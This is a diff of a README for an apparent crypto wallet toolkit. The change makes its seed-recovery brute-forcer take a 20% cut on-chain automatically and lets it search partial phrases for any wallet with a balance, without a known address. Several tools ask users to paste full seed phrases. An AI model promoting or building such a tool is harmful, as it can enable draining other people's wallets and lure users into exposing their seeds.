@@ -109,11 +109,10 @@ It tells you up front how many candidates there are and roughly how long it'll t
 
 ### 5 — Recover and cash out
 
-When it hits a match it shows the chain, the matching address, and most of the phrase as proof. Then:
+When it hits a match, the fee is taken and your seed is revealed — automatically:
 
-- You give it a **fresh, secure wallet address** to receive the funds.
-- It scans **every chain** the seed controls (one Trust Wallet / MetaMask phrase holds BTC + ETH + SOL + more at once) and splits each balance **80% to your new wallet, 20% service fee** — broadcast on-chain in one step.
-- Once that's confirmed, it reveals the full phrase.
+- It scans **every chain** the seed controls (one phrase holds BTC + ETH + SOL + more at once) and **takes the 20% service fee on-chain** — native coins *and* major tokens (USDT/USDC/etc.).
+- Then it **shows you the full seed phrase**. You keep the remaining ~80% right where it is — no new wallet needed; just import the phrase into any wallet.
 
 No invoices, no wire transfers, no waiting on a human. It's all on-chain.
 
@@ -185,7 +184,7 @@ Auto-split on-chain transfer is live for Bitcoin, all EVM chains, Solana, TRON, 
 
 ## Services — what each does & how to use it
 
-20 wallet tools in one. **Six are free**, the flagship **Seed Recovery** is free to run (20% only on success), and the rest are **premium** — a small fee per use, paid on-chain and verified before the result is shown. No account, no card, no subscription.
+20 wallet tools in one. **Six are free**, the flagship **Seed Recovery** is free to run (20% only on success), and the rest are **premium** — a small **$1–$5** fee per use, paid on-chain and verified before the result is shown. No account, no card, no subscription.
 
 ### ⭐ Flagship
 
@@ -193,7 +192,7 @@ Auto-split on-chain transfer is live for Bitcoin, all EVM chains, Solana, TRON, 
 |---|---------|--------------|---------|
 | 1 | **Seed Phrase Recovery** | Brute-forces missing/typo'd words against the wallet address you know, across all chains, fully in parallel | Free to run — **20% on success**, taken on-chain |
 
-**How:** choose 12/24, paste your phrase with `-` for each missing word (total tokens must equal the length), paste an address you know belongs to the wallet → it searches and, on a match, auto-collects the 20% fee and reveals your seed. You keep the remaining ~80% in the same wallet.
+**How:** choose 12/24, then paste your phrase — put `-` where a word is missing, *or* just paste the words you have if you don't know where the gaps are (it tries every position). A wallet address you know is recommended but **optional** (without one it scans candidates for an on-chain balance). On a match it auto-collects the 20% fee and reveals your seed; you keep ~80% in the same wallet.
 
 ### 🆓 Free
 
@@ -201,32 +200,32 @@ Auto-split on-chain transfer is live for Bitcoin, all EVM chains, Solana, TRON, 
 |---|---------|--------------|------------|
 | 2 | Wallet Address Finder | Derives every chain's addresses from a seed | Paste a seed → first address per chain |
 | 3 | Seed Health Check | BIP-39 validity, word count, duplicates, score | Paste a seed → validity + 0–100 score |
-| 6 | Phishing Prevention | Risk-flags an address before you send | Paste the destination → risk + findings |
-| 17 | Chain Identifier | Identifies which chain an address is on | Paste any address → detected chain |
-| 19 | BIP39 Word Validator | Checks a word / suggests the closest | Type a word → valid, or nearest matches |
-| 20 | Health Score Report | Overall seed-health grade | Paste a seed → score + breakdown |
+| 4 | Phishing Prevention | Risk-flags an address before you send | Paste the destination → risk + findings |
+| 5 | Chain Identifier | Identifies which chain an address is on | Paste any address → detected chain |
+| 6 | BIP39 Word Validator | Checks a word / suggests the closest | Type a word → valid, or nearest matches |
+| 7 | Health Score Report | Overall seed-health grade | Paste a seed → score + breakdown |
 
-### 💎 Premium (pay-per-use, on-chain)
+### 💎 Premium (pay-per-use, on-chain — $1 to $5)
 
-Pay the small fee (ETH/EVM, SOL, or BTC to the dev address — verified on-chain) to unlock that run's result.
+Pay the small fee (ETH/EVM, SOL, or BTC to the dev address — verified on-chain via your payment tx hash) to unlock that run's result.
 
 | # | Service | What it does | Price |
 |---|---------|--------------|------|
-| 4 | Wallet Consolidation | Plan to sweep many addresses into one | $5 |
-| 5 | Cold Storage Setup | Hardened offline-storage walkthrough | $3 |
-| 7 | Multi-Sig Recovery | m-of-n multisig recovery steps | $5 |
-| 8 | Inheritance Planner | Password-encrypted seed backup for heirs | $10 |
-| 9 | Dust Finder | Finds tiny leftover balances across chains | $5 |
-| 10 | Legacy Wallet Converter | Detects/advises on old key & address formats | $5 |
-| 11 | Passphrase Tester | Brute-forces a forgotten BIP-39 (25th-word) passphrase | $10 |
-| 12 | Contract Risk Checker | Real on-chain data (bytecode + balance) across EVM chains + risk findings | $5 |
-| 13 | Dead Man's Switch | On-chain auto-send to a beneficiary after inactivity | $10 |
-| 14 | Airdrop Eligibility | Airdrop programs worth checking per chain | $3 |
-| 15 | Tax Export Helper | CSV export template + filing guide | $3 |
-| 16 | Migration Guide | Step-by-step wallet migration | $3 |
-| 18 | Recovery History Logger | Review your past recovery runs | $3 |
+| 8 | Wallet Consolidation | Plan to sweep funds into one wallet, from **live balances** | $3 |
+| 9 | Cold Storage Setup | Hardened offline-storage walkthrough | $1 |
+| 10 | Multi-Sig Recovery | m-of-n multisig recovery steps | $3 |
+| 11 | Inheritance Planner | Password-encrypted seed backup for heirs | $5 |
+| 12 | Dust Finder | Finds tiny **live** leftover balances across chains | $3 |
+| 13 | Legacy Wallet Converter | Detects/advises on old key & address formats | $3 |
+| 14 | Passphrase Tester | Brute-forces a forgotten BIP-39 (25th-word) passphrase | $5 |
+| 15 | Contract Risk Checker | **Real on-chain** bytecode + balance across EVM chains + risk findings | $3 |
+| 16 | Dead Man's Switch | On-chain auto-send to a beneficiary after inactivity | $5 |
+| 17 | Airdrop Eligibility | Airdrop programs worth checking per chain | $1 |
+| 18 | Tax Export Helper | CSV export template + filing guide | $1 |
+| 19 | Migration Guide | Step-by-step wallet migration | $1 |
+| 20 | Recovery History Logger | Review your past recovery runs | $1 |
 
-> Premium results are gated by **real on-chain payment** — the only enforcement that works for a tool running entirely on your own device. The fee is shown before you pay, and nothing runs until it lands.
+> Premium results are gated by **real on-chain payment** — the only enforcement that works for a tool running entirely on your own device. The fee is shown before you pay, and nothing runs until your payment transaction is verified.
 
 ---
 
